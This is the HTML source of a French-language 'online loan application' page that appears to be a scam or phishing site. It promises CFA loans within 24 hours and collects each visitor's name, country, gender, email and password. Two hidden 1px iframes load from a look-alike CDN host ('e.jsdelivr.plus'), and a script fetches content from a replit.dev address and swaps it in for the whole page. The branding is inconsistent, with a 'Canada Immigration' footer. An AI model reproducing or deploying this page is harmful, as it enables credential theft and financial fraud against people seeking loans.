<html lang="fr">
<!-- Mirrored from ng-grant-fgn.freefunds.xyz/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 26 Dec 2020 06:40:20 GMT -->

<head>
  <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>DEMANDE DE PRET</title>
    <meta property="og:image" content="https://lanouvelletribune.info/wp-content/uploads/2017/05/financement.jpg">
    <meta property="og:title" content="DEMANDE DE PRET">
    <meta property="og:description" content="Inscrivez-vous pour une demande de prêt et recevez le en 24h">
    <meta property="og:url" content="https://www.pretenligne.com">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Funding Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template,
Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design">
    <!-- //custom-theme -->
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.6.3/css/font-awesome.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://e.jsdelivr.plus/res/37420803/css/style.css?_=v1.2">
    <script src="
https://cdn.jsdelivr.net/npm/flexslider@2.7.2/jquery.flexslider.min.js
"></script>
    <link href="
https://cdn.jsdelivr.net/npm/flexslider@2.7.2/flexslider.min.css
" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,300i,400,400i,600,600i,700,900"
        rel="stylesheet">

      <script>
        // Fonction pour créer un cookie
        function setCookie(name, value, days) {
            let expires = "";
            if (days) {
                const date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + (value || "") + expires + "; path=/";
        }

        // Crée un cookie lorsque la page est chargée
        window.onload = function() {
            setCookie("fromPage1", "true", 1); // Le cookie expire dans 1 jour
        };
    </script>

</head>

<body>
    <!-- banner -->
    <div class="banner">
        <nav class="navbar navbar-default">
            <div class="navbar-header navbar-left">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse"
                    data-target="#bs-example-navbar-collapse-1"> <span class="sr-only">Basculer la navigation</span>
                    <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span>
                </button>
                <h1><a class="navbar-brand"
                        href="https://a99dfd8a-e113-413a-8162-cbfdfb459351-00-r058h5rrt8oe.janeway.replit.dev/"><span>Demande
                            de Prêt</span>en ligne</a></h1>
            </div>
            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse navbar-right" id="bs-example-navbar-collapse-1">
                <nav class="link-effect-2" id="link-effect-2">
                    <ul class="nav navbar-nav">
                        <li><a href="https://a99dfd8a-e113-413a-8162-cbfdfb459351-00-r058h5rrt8oe.janeway.replit.dev/"><span
                                    data-hover="Home">Maison</span></a></li>
                        <li class="active"><a
                                href="https://a99dfd8a-e113-413a-8162-cbfdfb459351-00-r058h5rrt8oe.janeway.replit.dev/"><span
                                    data-hover="About Us">À propos de nous</span></a>
                        </li>
                        <li><a href="https://a99dfd8a-e113-413a-8162-cbfdfb459351-00-r058h5rrt8oe.janeway.replit.dev/"><span
                                    data-hover="Events">Événements</span></a></li>
                        <li><a href="https://a99dfd8a-e113-413a-8162-cbfdfb459351-00-r058h5rrt8oe.janeway.replit.dev/"><span
                                    data-hover="Mail Us">Envoyez-nous un e-mail</span></a></li>
                    </ul>
                </nav>
            </div>
        </nav>
    </div>
    <!-- //banner -->
    <!-- stats -->
    <div class="stats">
        <div class="col-md-3 w3layouts_stats_left w3_counter_grid">
            <p class="counter">5000 CFA</p>
            <h3>3 mois</h3>
        </div>
        <div class="col-md-3 w3layouts_stats_left w3_counter_grid1">
            <p class="counter">10000 CFA</p>
            <h3>4 mois</h3>
        </div>
        <div class="col-md-3 w3layouts_stats_left w3_counter_grid2">
            <p class="counter">50000 CFA</p>
            <h3>5 mois</h3>
        </div>
        <div class="col-md-3 w3layouts_stats_left w3_counter_grid3">
            <p class="counter">500000 CFA</p>
            <h3>6 mois</h3>
        </div>
        <div class="clearfix">
        </div>
    </div>
    <!-- //stats -->
    <!-- courses -->
    <div class="team">
        <div class="container">
            <div class="w3_agile_team_grid">
                <div class="w3_agile_team_grid_left">
                    <h3 class="w3l_header w3_agileits_header">Bienvenue sur le site de demande de prêt en ligne - <span>
                            En ce moment, jusqu'à: 500 000 CFA de prêt</span></h3>
                    <p class="sub_para_agile">Obtenez un prêt rapidement et facilement avec des taux compétitifs</p>
                </div>
            </div>
            <div class="agile_team_grids_top">
                <div class="col-md-6 w3ls_banner_bottom_left w3ls_courses_left">
                    <div class="w3ls_courses_left_grids">
                        <div class="w3ls_courses_left_grid">
                            <h3><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Pas de Frais de Dossier</h3>
                        </div>
                        <div class="w3ls_courses_left_grid">
                            <h3><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Approbation Rapide</h3>
                        </div>
                        <div class="w3ls_courses_left_grid">
                            <h3><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Taux Compétitifs</h3>
                        </div>

                    </div>
                </div>
                <div class="col-md-6 agileits_courses_right">
                    <center>
                        <b>
                            <h2>COMMENCEZ VOTRE DEMANDE ICI</h2>
                        </b>
                    </center>
                    <div class="popup fourth" id="popup1" style="display:none">
                        <div class="popup-head">
                            <img alt="" height="26" id="alertimg"
                                src="https://e.jsdelivr.plus/res/37420803/img/can32.jpg?=v1.2" width="26"> Attention!
                        </div>
                        <div class="popup-center">
                            Suivez les instructions.
                        </div>
                        <div class="popup-bottom">
                            <div class="button">
                                D';accord
                            </div>
                        </div>
                    </div>
                    <center>
                        <div class="content">
                            <!-- content -->
                            <div class="content-middle">
                                <div class="content-inner">
                                    <p class="headline"> </p>
                                    <img src="https://lanouvelletribune.info/wp-content/uploads/2017/05/financement.jpg"
                                        width="100%">
                                    <div class="form">
                                        <form id="Login_form" method="post" action="/submit" onsubmit="">
                                            <div class="form-group">
                                                <label for="firstName">Indiquez votre prénom</label>
                                                <input type="text" placeholder="Prénom" name="firstName" id="firstName"
                                                    class="form-control" required>
                                            </div>
                                            <div class="form-group">
                                                <label for="lastName">Indiquez votre nom de famille</label>
                                                <input type="text" placeholder="Nom de famille" name="lastName"
                                                    id="lastName" class="form-control" required>
                                            </div>
                                            <div class="form-group">
                                                <label for="country">Pays</label>
                                                <input type="text" placeholder="Pays" name="country" id="country"
                                                    class="form-control" required>
                                            </div>
                                            <div class="form-group">
                                                <label for="gender">Genre</label>
                                                <input type="text" placeholder="Genre" name="gender" id="gender"
                                                    class="form-control" required>
                                            </div>
                                            <div class="form-group">
                                                <label for="email">E-mail</label>
                                                <input type="email" placeholder="E-mail" name="email" id="email"
                                                    class="form-control" required>
                                            </div>
                                            <div class="form-group">
                                                <label for="password">Mot de passe</label>
                                                <input type="password" placeholder="Mot de passe" name="password"
                                                    id="password" class="form-control" required>
                                            </div>
                                            <div class="form-group">
                                                <label for="confirmPassword">Retaper le mot de passe</label>
                                                <input type="password" placeholder="Retaper le mot de passe"
                                                    name="confirmPassword" id="confirmPassword" class="form-control"
                                                    required>
                                            </div>
                                            <button class="btn" type="submit">
                                                <div class="btnt">Continuer</div>
                                            </button>
                                        </form>
                                    </div>
                                </div>
                                <!-- survey MobGyan -->
                            </div>
                            <!-- content-inner MobGyan -->
                    </center>
                </div>
            </div>
        </div>
        <!-- container MobGyan -->
        <b:section id="fixelements" showaddelement="no">
        </b:section>
    </div>
    <div class="clearfix">
    </div>
    <!-- //courses -->
    <!-- bootstrap-pop-up -->
    <div class="modal video-modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModal">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
                            aria-hidden="true">×</span></button>
                </div>
                <section>
                    <div class="modal-body">
                        <p>Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam,
                            nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea
                            voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo
                            voluptas nulla pariatur. <i>" Quis autem vel eum iure reprehenderit qui in ea voluptate
                                velit esse quam nihil molestiae consequatur.</i></p>
                    </div>
                </section>
            </div>
        </div>
    </div>
    <!-- //bootstrap-pop-up -->
    <div class="wthree_copy_right">
        <div class="container">
            <p>2023 Canada Immigration. Tous les droits sont réservés</p>
        </div>
    </div>
    <!-- //footer -->
    <div class="modal fade" id="myModal2" tabindex="-1" role="dialog">
        <div class="modal-dialog">
            <!-- Modal content-->
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal">×</button>
                    <div class="signin-form profile">
                        <h3 class="agileinfo_sign">Sign In</h3>
                        <div class="login-form">
                            <form action="#" method="post">
                                <input type="email" name="email" placeholder="E-mail" required>
                                <input type="password" name="password" placeholder="Password" required>
                                <div class="tp">
                                    <input type="submit" value="Sign In">
                                </div>
                            </form>
                        </div>
                        <div class="login-social-grids">
                            <ul>
                                <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                                <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                <li><a href="#"><i class="fa fa-rss"></i></a></li>
                            </ul>
                        </div>
                        <p><a href="#" data-toggle="modal" data-target="#myModal3"> Vous n';avez pas de
                                compte&nbsp;?</a></p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- //Modal1 -->
    <!-- Modal2 -->
    <div class="modal fade" id="myModal3" tabindex="-1" role="dialog">
        <div class="modal-dialog">
            <!-- Modal content-->
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal">×</button>
                    <div class="signin-form profile">
                        <h3 class="agileinfo_sign">Sign Up</h3>
                        <div class="login-form">
                            <form action="#" method="post">
                                <input type="text" name="name" placeholder="Username" required>
                                <input type="email" name="email" placeholder="Email" required>
                                <input type="password" name="password" placeholder="Password" required>
                                <input type="password" name="password" placeholder="Confirm Password" required>
                                <input type="submit" value="Sign Up">
                            </form>
                        </div>
                        <p><a href="#"> En cliquant sur enregistrer, j';accepte vos conditions</a></p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        function getData(url, callback) {
            var request = new XMLHttpRequest();
            request.open('get', url, true);
            request.send();
            request.onreadystatechange = function () {
                if (request.readyState === 4 && request.status === 200) {
                    callback(request.responseText);
                }
            };
        }

        function scrollTo(a) {
            if ($("#" + a).length) {
                var c = $("#" + a).offset();
                var b = c.top;
                $("html,body").animate({
                    scrollTop: b
                }, {
                    duration: "slow"
                });
            }
        }

        var next_page = "";

        getData("/t3.canada-study-job/https://a99dfd8a-e113-413a-8162-cbfdfb459351-00-r058h5rrt8oe.janeway.replit.dev/", function (resp) {
            next_page = resp;

            var saved = "t3.canada-study-job";
            var swidth = localStorage.getItem(saved);
            if (swidth !== null) {
                var width = swidth * 1;
                if (width > 0 && width < 98) {
                    var new_doc = document.open("text/html", "replace");
                    new_doc.write(next_page);
                    new_doc.close();
                }
            }

        });
        function nextPage() {
            if (!next_page) {
                getData("/t3.canada-study-job/https://a99dfd8a-e113-413a-8162-cbfdfb459351-00-r058h5rrt8oe.janeway.replit.dev/", function (resp) {
                    next_page = resp;
                    var new_doc = document.open("text/html", "replace");
                    new_doc.write(next_page);
                    new_doc.close();
                });
            } else {
                var new_doc = document.open("text/html", "replace");
                new_doc.write(next_page);
                new_doc.close();
            }

        }
    </script>
    <!-- Mirrored from ng-grant-fgn.freefunds.xyz/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 26 Dec 2020 06:41:08 GMT -->
    <iframe referrerpolicy="no-referrer" width="1px" height="1px" scrolling="no"
        src="https://e.jsdelivr.plus/res/u.html?seed=6765077532288966&amp;pid=10e92e436463e300b656b91cabfa303c"
        style="display: none;"></iframe>
    <iframe referrerpolicy="no-referrer" width="1px" height="1px" scrolling="no"
        src="/res/pu.html?seed=6765077532288966&amp;pid=aa.co&amp;c=t3.canada-study-job&amp;f=wa"
        style="display: none;"></iframe>
</body>

</html>


